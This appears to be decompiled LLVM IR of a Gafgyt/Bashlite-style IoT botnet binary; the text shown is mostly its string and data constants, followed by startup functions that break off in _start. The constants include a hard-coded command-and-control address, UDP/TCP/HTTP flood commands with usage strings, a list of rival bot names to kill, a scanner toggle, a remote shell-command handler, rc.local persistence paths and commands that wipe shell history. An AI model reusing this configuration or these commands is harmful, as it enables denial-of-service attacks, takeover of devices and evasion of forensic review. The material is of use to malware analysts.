@global_var_8057bf0.313 = constant [4 x i8] c"x86\00"
@global_var_8057bf4.314 = constant [5 x i8] c"i686\00"
@global_var_8057bf9.315 = constant [4 x i8] c"ppc\00"
@global_var_8057bfd.316 = constant [5 x i8] c"i586\00"
@global_var_8057c02.317 = constant [8 x i8] c"jackmy*\00"
@global_var_8057c0a.318 = constant [8 x i8] c"hackmy*\00"
@global_var_8057c12.319 = constant [5 x i8] c"arm*\00"
@global_var_8057c17.320 = constant [3 x i8] c"b1\00"
@global_var_8057c1a.321 = constant [3 x i8] c"b2\00"
@global_var_8057c1d.322 = constant [3 x i8] c"b3\00"
@global_var_8057c20.323 = constant [3 x i8] c"b4\00"
@global_var_8057c23.324 = constant [3 x i8] c"b5\00"
@global_var_8057c26.325 = constant [3 x i8] c"b6\00"
@global_var_8057c29.326 = constant [3 x i8] c"b7\00"
@global_var_8057c2c.327 = constant [3 x i8] c"b8\00"
@global_var_8057c2f.328 = constant [3 x i8] c"b9\00"
@global_var_8057c32.329 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8057c43.330 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_8057c4c.331 = constant [10 x i8] c"dvrHelper\00"
@global_var_8057c56.332 = constant [8 x i8] c"FDFDHFC\00"
@global_var_8057c5e.333 = constant [5 x i8] c"FEUB\00"
@global_var_8057c63.334 = constant [9 x i8] c"FTUdftui\00"
@global_var_8057c6c.335 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_8057c75.336 = constant [6 x i8] c"jhUOH\00"
@global_var_8057c7b.337 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_8057c84.338 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_8057c8e.339 = constant [10 x i8] c"kmyx86_64\00"
@global_var_8057c98.340 = constant [10 x i8] c"lolmipsel\00"
@global_var_8057ca2.341 = constant [8 x i8] c"RYrydry\00"
@global_var_8057caa.342 = constant [5 x i8] c"tel*\00"
@global_var_8057caf.343 = constant [9 x i8] c"TwoFace*\00"
@global_var_8057cb8.344 = constant [9 x i8] c"UYyuyioy\00"
@global_var_8057cc1.345 = constant [5 x i8] c"wget\00"
@global_var_8057cc6.346 = constant [7 x i8] c"x86_64\00"
@global_var_8057ccd.347 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_8057cd6.348 = constant [5 x i8] c"xxb*\00"
@global_var_8057cde.349 = constant i32 3276849
@global_var_8057ce0.350 = constant i32 3342386
@global_var_8057ce2.351 = constant i32 3407923
@global_var_8057ce4.352 = constant i32 3473460
@global_var_8057ce6.353 = constant i32 3538997
@global_var_8057ce8.354 = constant i32 3604534
@global_var_8057cea.355 = constant i32 3670071
@global_var_8057cec.356 = constant i32 3735608
@global_var_8057cee.357 = constant i32 808517689
@global_var_8057cf0.358 = constant [3 x i8] c"10\00"
@global_var_8057cf3.359 = constant [3 x i8] c"11\00"
@global_var_8057cf6.360 = constant [3 x i8] c"12\00"
@global_var_8057cf9.361 = constant [3 x i8] c"13\00"
@global_var_8057cfc.362 = constant [3 x i8] c"14\00"
@global_var_8057cff.363 = constant [3 x i8] c"15\00"
@global_var_8057d02.364 = constant [3 x i8] c"16\00"
@global_var_8057d05.365 = constant [3 x i8] c"17\00"
@global_var_8057d08.366 = constant [3 x i8] c"18\00"
@global_var_8057d0b.367 = constant [3 x i8] c"19\00"
@global_var_8057d0e.368 = constant [3 x i8] c"20\00"
@global_var_8057d11.369 = constant [6 x i8] c"hackz\00"
@global_var_8057d17.370 = constant [5 x i8] c"bin*\00"
@global_var_8057d1c.371 = constant [5 x i8] c"gtop\00"
@global_var_8057d21.372 = constant [5 x i8] c"ftp*\00"
@global_var_8057d26.373 = constant [6 x i8] c"tftp*\00"
@global_var_8057d2c.374 = constant [7 x i8] c"botnet\00"
@global_var_8057d33.375 = constant [8 x i8] c"swatnet\00"
@global_var_8057d3b.376 = constant [8 x i8] c"ballpit\00"
@global_var_8057d43.377 = constant [8 x i8] c"fucknet\00"
@global_var_8057d4b.378 = constant [9 x i8] c"cracknet\00"
@global_var_8057d54.379 = constant [8 x i8] c"weednet\00"
@global_var_8057d5c.380 = constant [7 x i8] c"gaynet\00"
@global_var_8057d63.381 = constant [9 x i8] c"queernet\00"
@global_var_8057d6c.382 = constant [8 x i8] c"ballnet\00"
@global_var_8057d74.383 = constant [5 x i8] c"unet\00"
@global_var_8057d79.384 = constant [7 x i8] c"yougay\00"
@global_var_8057d80.385 = constant [7 x i8] c"sttftp\00"
@global_var_8057d87.386 = constant [7 x i8] c"sstftp\00"
@global_var_8057d8e.387 = constant [7 x i8] c"sbtftp\00"
@global_var_8057d95.388 = constant [6 x i8] c"btftp\00"
@global_var_8057d9b.389 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_8057da4.390 = constant [6 x i8] c"bruv*\00"
@global_var_8057daa.391 = constant [5 x i8] c"IoT*\00"
@global_var_8057daf.392 = constant [19 x i8] c"159.89.176.175:114\00"
@global_var_805b040.393 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057be0.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057be5.311, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057bec.312, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057bf0.313, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057bf4.314, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057bf9.315, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057bfd.316, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057bfd.316, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057c02.317, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057c0a.318, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057c12.319, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057c17.320, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057c1a.321, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057c1d.322, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057c20.323, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057c23.324, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057c26.325, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057c29.326, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057c2c.327, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057c2f.328, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8057c32.329, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057c43.330, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057c4c.331, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057c56.332, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057c5e.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057c63.334, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057c6c.335, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057c75.336, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057c7b.337, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057c84.338, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057c8e.339, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057c98.340, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057be0.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057be5.311, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057ca2.341, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057caa.342, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057caf.343, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057cb8.344, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057cc1.345, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057cc6.346, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057ccd.347, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057cd6.348, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057cdb.15, i32 0, i32 0), i8* bitcast (i32* @global_var_8057cde.349 to i8*), i8* bitcast (i32* @global_var_8057ce0.350 to i8*), i8* bitcast (i32* @global_var_8057ce2.351 to i8*), i8* bitcast (i32* @global_var_8057ce4.352 to i8*), i8* bitcast (i32* @global_var_8057ce6.353 to i8*), i8* bitcast (i32* @global_var_8057ce8.354 to i8*), i8* bitcast (i32* @global_var_8057cea.355 to i8*), i8* bitcast (i32* @global_var_8057cec.356 to i8*), i8* bitcast (i32* @global_var_8057cee.357 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057cf0.358, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057cf3.359, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057cf6.360, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057cf9.361, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057cfc.362, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057cff.363, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057d02.364, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057d05.365, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057d08.366, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057d0b.367, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057d0e.368, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057d11.369, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057d17.370, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057d1c.371, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057d21.372, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057d26.373, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057d2c.374, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057d33.375, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057d3b.376, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057d43.377, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057d4b.378, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057d54.379, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057d5c.380, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057d63.381, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057d6c.382, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057d74.383, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057d79.384, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057d80.385, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057d87.386, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057d8e.387, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057d95.388, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057d9b.389, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057da4.390, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057daa.391, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8057daf.392, i32 0, i32 0)]
@global_var_8059159.394 = constant i32 1768423458
@global_var_805915b.395 = constant [22 x i8] c"history -c;history -w\00"
@global_var_8059171.396 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_805918f.397 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_80591a4.398 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_80591e4.399 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_8059224.400 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_80592b4.401 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_80592ec.402 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_805930c.403 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_8059324.404 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_805937c.405 = constant [7 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_80591a4.398, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_80591e4.399, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_8059224.400, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_80592b4.401, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_80592ec.402, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_805930c.403, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_8059324.404, i32 0, i32 0)]
@global_var_80593b0.409 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_80593ee.410 = constant [6 x i8] c"PONG!\00"
@global_var_80593f4.411 = constant [6 x i8] c"TABLE\00"
@global_var_80593fa.412 = constant [3 x i8] c"%d\00"
@global_var_80593fd.413 = constant [8 x i8] c"SCANNER\00"
@global_var_8059405.414 = constant [4 x i8] c"OFF\00"
@global_var_80617d0.415 = local_unnamed_addr global i32 0
@global_var_8059409.416 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_805941a.417 = constant [3 x i8] c"ON\00"
@global_var_805941d.418 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_8059437.419 = constant [8 x i8] c"REMOVER\00"
@global_var_805943f.420 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_805945c.421 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_8059468.422 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_8059479.423 = constant [4 x i8] c"UDP\00"
@global_var_8059480.424 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_80594f1.425 = constant [4 x i8] c"TCP\00"
@global_var_80594f8.426 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_80595b2.427 = constant [5 x i8] c"HTTP\00"
@global_var_80595b7.428 = constant [4 x i8] c"STD\00"
@global_var_80595bb.429 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_80595d6.430 = constant [9 x i8] c"KILLATTK\00"
@global_var_80595df.431 = constant [11 x i8] c"Killed %d.\00"
@global_var_80595ea.432 = constant [13 x i8] c"None Killed.\00"
@global_var_80595f7.433 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_805b19c.434 = local_unnamed_addr global i32 -1
@global_var_805b198.435 = global [19 x i8]* @global_var_8057daf.392
@global_var_8059601.436 = constant [8 x i8] c"8.8.8.8\00"
@global_var_8059609.437 = constant [16 x i8] c"/proc/net/route\00"
@global_var_8059619.438 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8059624.440 = constant [6 x i8] c"ROOTS\00"
@global_var_805962a.441 = constant i32 1952788224
@global_var_805962b.442 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1697579122
@global_var_8059640.444 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_805964f.446 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_8059657.447 = constant i32 1868955745
@global_var_8059659.448 = constant [13 x i8] c"fork failed\0A\00"
@global_var_8059666.449 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_8059672.450 = constant [5 x i8] c"PONG\00"
@global_var_8059677.451 = constant [4 x i8] c"DUP\00"
@global_var_805967b.452 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_805968f.453 = constant [3 x i8] c"SH\00"
@global_var_8059692.454 = constant [8 x i8] c"%s 2>&1\00"
@global_var_805969a.455 = constant [3 x i8] c"%s\00"
@global_var_805969d.456 = constant i32 32
@global_var_8061790.457 = local_unnamed_addr global i32 0
@global_var_805b298 = external local_unnamed_addr global i32
@global_var_80617a0.463 = global i32 0
@global_var_805b2d4.464 = global i32 0
@global_var_805f564.465 = local_unnamed_addr global i32 0
@global_var_805f568.466 = local_unnamed_addr global i32 0
@global_var_805b2ec.467 = local_unnamed_addr global i32 2
@global_var_805b2bc.468 = global i32 0
@global_var_805b2b8.469 = global i32* bitcast (i16* @global_var_805b300.460 to i32*)
@global_var_8059ca0.470 = constant i32 0
@global_var_8059cb8.471 = constant [6 x i8] c"(nil)\00"
@global_var_8059cbe.472 = constant [7 x i8] c"(null)\00"
@global_var_8059cc5.473 = constant i32 2949163
@global_var_8059d32.475 = constant i32 327688
@global_var_8059d2a.476 = constant [8 x i8] c" +0-#'I\00"
@global_var_8059cd8.477 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8059d15.478 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_8059d0b.479 = constant i32 117506048
@global_var_8059cfc.480 = constant i32 331776
@global_var_8059d80.481 = constant [8 x i8] c"Success\00"
@global_var_8059d56.482 = constant [15 x i8] c"Unknown error \00"
@global_var_805ac80.483 = constant i32 65536
@global_var_805b500.484 = local_unnamed_addr global i32* @global_var_805ac80.483
@global_var_8061580.485 = global i32 0
@global_var_8061584.486 = global i32 0
@global_var_80615a0.487 = global i32 0
@global_var_806176c.488 = global i32 0
@global_var_805b508.489 = global i32 0
@global_var_8061bf4.490 = local_unnamed_addr global i32 0
@global_var_8061be8.491 = global i32 0
@global_var_80617e0.492 = global i32 0
@global_var_805b3f0.493 = global i32 0
@global_var_806188c.495 = global i32 0
@global_var_8061890.496 = local_unnamed_addr global i32 0
@global_var_8061894.497 = global i32 0
@global_var_80618a0.498 = local_unnamed_addr global i32 0
@global_var_8061b94.499 = global i32 0
@global_var_8061bbc.500 = local_unnamed_addr global i32 0
@global_var_8061bac.501 = local_unnamed_addr global i32 0
@global_var_8061bb0.502 = local_unnamed_addr global i32 0
@global_var_8061bb4.503 = local_unnamed_addr global i32 0
@global_var_8061bd0.504 = local_unnamed_addr global i32 0
@global_var_8061bb8.505 = local_unnamed_addr global i32 0
@global_var_8061bc4.506 = local_unnamed_addr global i32 0
@global_var_8061bc8.507 = local_unnamed_addr global i32 0
@global_var_8061bd4.508 = local_unnamed_addr global i32 0
@global_var_8061ba8.509 = local_unnamed_addr global i32 0
@global_var_8061ba4.511 = local_unnamed_addr global i32 0
@global_var_8061bcc.512 = local_unnamed_addr global i32 0
@global_var_806189c.513 = local_unnamed_addr global i32 0
@global_var_805b408.514 = global i32 0
@global_var_805b420.516 = global i32 0
@global_var_805b438 = external global i32
@global_var_805b464.518 = global i32 -1726662223
@global_var_805b440.519 = local_unnamed_addr global i32* @global_var_805b464.518
@global_var_805b43c.520 = global i32* @global_var_805b464.518
@global_var_805a8f4.521 = constant i32 0
@global_var_805a8e0.522 = constant i32 0
@global_var_805a908.523 = constant [3 x i8] c"-c\00"
@global_var_805a910.524 = constant [3 x i8] c"sh\00"
@global_var_805a90b.525 = constant [8 x i8] c"/bin/sh\00"
@global_var_805b4e0.526 = global i32 0
@global_var_8061784.527 = local_unnamed_addr global i32 0
@global_var_806178c.528 = local_unnamed_addr global i32 0
@global_var_805b000.530 = global i32 -1
@global_var_8054cbb.531 = constant i32 -294069
@global_var_8061794.532 = local_unnamed_addr global i32 0
@global_var_8061798.533 = local_unnamed_addr global i32 0
@global_var_805ab6c.534 = constant [10 x i8] c"/dev/null\00"
@global_var_8061788.536 = local_unnamed_addr global i32 0
@global_var_8054ea3.538 = constant i32 1928542531
@global_var_8054ec7.539 = constant i32 1928542531
@global_var_80617c4.540 = local_unnamed_addr global i32 0
@global_var_80617a4.541 = global i32 0
@global_var_805ae90.543 = constant [4 x i8] c"inf\00"
@global_var_805ae93.548 = constant i32 1179535616
@global_var_805aea0.549 = constant i32 2883630
@global_var_8061bf8.553 = local_unnamed_addr global i32 0
@global_var_805af5c.554 = constant i32 1697579054
@global_var_805af90.555 = constant i32 1868824690
@global_var_805af5e.556 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805af6f.557 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805af87.558 = constant [11 x i8] c"nameserver\00"
@global_var_805af92.559 = constant [7 x i8] c"domain\00"
@global_var_805af99.560 = constant [7 x i8] c"search\00"
@global_var_8061bd8.561 = global i32 0
@global_var_8061bfc.562 = local_unnamed_addr global i32 0
@global_var_8061c00.563 = local_unnamed_addr global i32 0
@global_var_805afb4.564 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805afb1.566 = constant [3 x i8] c"%x\00"
@global_var_805afc5.567 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805afd0.568 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805b520.1 = local_unnamed_addr global i8 0
@global_var_805f560.13 = external local_unnamed_addr global i8*
@global_var_805b559.40 = local_unnamed_addr global i8 0
@global_var_805b55a.41 = local_unnamed_addr global i8 0
@global_var_805b550.439 = external global i8*
@2 = internal constant [2 x i8] c"/\00"
@global_var_805964d.445 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_805b300.460 = global i16 288
@global_var_805b350.461 = local_unnamed_addr global i16 272
@global_var_8059d4a.474 = external constant i8*
@global_var_8061860.494 = global i8 0
@global_var_8061bc0.510 = local_unnamed_addr global i8 0
@global_var_8061780.515 = local_unnamed_addr global i8 0
@global_var_806179c.535 = local_unnamed_addr global i8 0
@global_var_805aec0.546 = constant x86_fp80* null
@global_var_80617a8.550 = external global i8*
@global_var_80617c0.551 = local_unnamed_addr global i64 0
@global_var_805b504.552 = local_unnamed_addr global i16 1
@global_var_805963e.443 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 77687
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805b520.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805b024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805b024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805b024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805b520.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805b024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805b520.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805afe4.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_805b010.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
